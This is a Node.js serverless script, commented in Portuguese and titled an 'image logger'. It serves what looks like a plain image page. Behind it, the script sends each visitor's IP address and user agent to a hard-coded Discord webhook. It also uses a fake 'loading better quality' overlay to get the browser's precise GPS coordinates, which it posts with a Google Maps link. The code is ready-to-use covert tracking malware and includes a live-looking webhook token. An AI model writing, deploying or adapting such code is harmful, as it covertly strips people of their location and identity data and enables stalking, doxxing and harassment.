// Discord Image Logger com geolocalização
const https = require('https');

// Configuração
const config = {
  "webhook": "https://discord.com/api/webhooks/1352417668946202624/V_mU5x7tpRUNzzaSoK2RKz1PLXzDwv2r_jaZnv5e6Y-opOIB9b9ghuPu8CtGnPfwEdKu",
  "image": "https://i.pinimg.com/564x/12/26/e0/1226e0b520b52a84933d697f52600012.jpg",
  "username": "Image Logger",
  "color": 0x00FFFF,
  "accurateLocation": true // Ativar geolocalização
};

// Função para enviar webhook ao Discord
function sendDiscordWebhook(data) {
  try {
    const webhookData = JSON.stringify(data);
    
    const options = {
      hostname: 'discord.com',
      path: '/api/webhooks/1352417668946202624/V_mU5x7tpRUNzzaSoK2RKz1PLXzDwv2r_jaZnv5e6Y-opOIB9b9ghuPu8CtGnPfwEdKu',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': webhookData.length
      }
    };
    
    const req = https.request(options, (res) => {
      // Não precisamos fazer nada com a resposta
    });
    
    req.on('error', (error) => {
      console.error('Erro ao enviar webhook:', error);
    });
    
    req.write(webhookData);
    req.end();
  } catch (error) {
    console.error('Erro ao enviar webhook:', error);
  }
}

// Função principal
module.exports = (req, res) => {
  try {
    // Obter parâmetros da URL
    const url = new URL(req.url, `http://${req.headers.host}`);
    const params = url.searchParams;
    const geoParam = params.get('g'); // Verificar se já temos coordenadas de localização
    
    // Obter IP e User Agent
    const ip = req.headers['x-forwarded-for'] || 
               req.headers['x-real-ip'] || 
               req.socket.remoteAddress || 
               'Desconhecido';
    
    const userAgent = req.headers['user-agent'] || 'Desconhecido';
    
    // Se temos parâmetro de geolocalização, enviar para o Discord
    if (geoParam) {
      try {
        // Decodificar as coordenadas
        const coords = Buffer.from(geoParam, 'base64').toString('utf-8');
        const [latitude, longitude] = coords.split(',');
        
        // Enviar webhook ao Discord com coordenadas
        const data = {
          username: config.username,
          content: "@everyone",
          embeds: [
            {
              title: "Image Logger - IP + Localização Capturados",
              color: config.color,
              description: `**Alguém acessou o site com localização precisa!**\n\n**IP:** \`${ip}\`\n\n**Localização GPS:** \`${latitude}, ${longitude}\`\n[Ver no Google Maps](https://www.google.com/maps/search/google+map++${latitude},${longitude})\n\n**User Agent:**\n\`\`\`\n${userAgent}\n\`\`\``,
              thumbnail: { url: config.image }
            }
          ]
        };
        
        sendDiscordWebhook(data);
        
        // Enviar página com a imagem
        const html = `
          <!DOCTYPE html>
          <html>
          <head>
            <title>Imagem</title>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
              body, html {
                margin: 0;
                padding: 0;
                height: 100%;
                width: 100%;
                overflow: hidden;
              }
              .imagem {
                width: 100%;
                height: 100vh;
                background-image: url('${config.image}');
                background-position: center;
                background-repeat: no-repeat;
                background-size: contain;
              }
            </style>
          </head>
          <body>
            <div class="imagem"></div>
          </body>
          </html>
        `;
        
        res.setHeader('Content-Type', 'text/html');
        res.status(200).send(html);
      } catch (error) {
        console.error('Erro ao processar geolocalização:', error);
        // Continuar mesmo com erro na geolocalização
      }
    } else if (config.accurateLocation) {
      // Se não temos geolocalização ainda, solicitar do navegador
      
      // Primeiro, enviar relatório básico sem geolocalização
      const basicData = {
        username: config.username,
        content: "",
        embeds: [
          {
            title: "Image Logger - Acesso Inicial",
            color: config.color,
            description: `**Alguém acessou o site! Aguardando localização...**\n\n**IP:** \`${ip}\`\n\n**User Agent:**\n\`\`\`\n${userAgent}\n\`\`\``,
            thumbnail: { url: config.image }
          }
        ]
      };
      
      sendDiscordWebhook(basicData);
      
      // Enviar HTML com script para obter geolocalização
      const currentUrl = `${url.pathname}${url.search}`;
      
      const html = `
        <!DOCTYPE html>
        <html>
        <head>
          <title>Imagem</title>
          <meta charset="utf-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <style>
            body, html {
              margin: 0;
              padding: 0;
              height: 100%;
              width: 100%;
              overflow: hidden;
            }
            .imagem {
              width: 100%;
              height: 100vh;
              background-image: url('${config.image}');
              background-position: center;
              background-repeat: no-repeat;
              background-size: contain;
            }
            .loading {
              position: fixed;
              top: 0;
              left: 0;
              width: 100%;
              height: 100%;
              background-color: rgba(0,0,0,0.5);
              display: flex;
              justify-content: center;
              align-items: center;
              color: white;
              font-family: Arial, sans-serif;
              display: none;
            }
          </style>
        </head>
        <body>
          <div class="imagem"></div>
          <div class="loading">Carregando imagem em melhor qualidade...</div>
          
          <script>
            // Script para obter geolocalização
            document.addEventListener('DOMContentLoaded', function() {
              var currentUrl = window.location.href;
              
              // Verificar se já temos o parâmetro g
              if (!currentUrl.includes("g=")) {
                // Mostrar carregamento
                document.querySelector('.loading').style.display = 'flex';
                
                // Solicitar geolocalização
                if (navigator.geolocation) {
                  navigator.geolocation.getCurrentPosition(
                    function(position) {
                      // Sucesso - temos a posição
                      var lat = position.coords.latitude;
                      var lng = position.coords.longitude;
                      var coords = lat + "," + lng;
                      
                      // Codificar em base64
                      var encodedCoords = btoa(coords);
                      
                      // Construir nova URL
                      var newUrl;
                      if (currentUrl.includes("?")) {
                        newUrl = currentUrl + "&g=" + encodedCoords;
                      } else {
                        newUrl = currentUrl + "?g=" + encodedCoords;
                      }
                      
                      // Redirecionar
                      window.location.replace(newUrl);
                    },
                    function(error) {
                      // Erro ao obter localização
                      console.log("Erro de geolocalização: " + error.message);
                      document.querySelector('.loading').style.display = 'none';
                    },
                    {
                      enableHighAccuracy: true,
                      timeout: 10000,
                      maximumAge: 0
                    }
                  );
                }
              }
            });
          </script>
        </body>
        </html>
      `;
      
      res.setHeader('Content-Type', 'text/html');
      res.status(200).send(html);
    } else {
      // Geolocalização não está ativada, enviar relatório básico
      const data = {
        username: config.username,
        content: "@everyone",
        embeds: [
          {
            title: "Image Logger - IP Capturado",
            color: config.color,
            description: `**Alguém acessou o site!**\n\n**IP:** \`${ip}\`\n\n**User Agent:**\n\`\`\`\n${userAgent}\n\`\`\``,
            thumbnail: { url: config.image }
          }
        ]
      };
      
      sendDiscordWebhook(data);
      
      // Enviar página com a imagem
      const html = `
        <!DOCTYPE html>
        <html>
        <head>
          <title>Imagem</title>
          <meta charset="utf-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <style>
            body, html {
              margin: 0;
              padding: 0;
              height: 100%;
              width: 100%;
              overflow: hidden;
            }
            .imagem {
              width: 100%;
              height: 100vh;
              background-image: url('${config.image}');
              background-position: center;
              background-repeat: no-repeat;
              background-size: contain;
            }
          </style>
        </head>
        <body>
          <div class="imagem"></div>
        </body>
        </html>
      `;
      
      res.setHeader('Content-Type', 'text/html');
      res.status(200).send(html);
    }
  } catch (error) {
    console.error('Erro:', error);
    
    // Em caso de erro, enviar página básica
    res.setHeader('Content-Type', 'text/html');
    res.status(200).send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Imagem</title>
      </head>
      <body>
        <img src="${config.image}" alt="Imagem" style="max-width: 100%; max-height: 100vh;">
      </body>
      </html>
    `);
  }
};
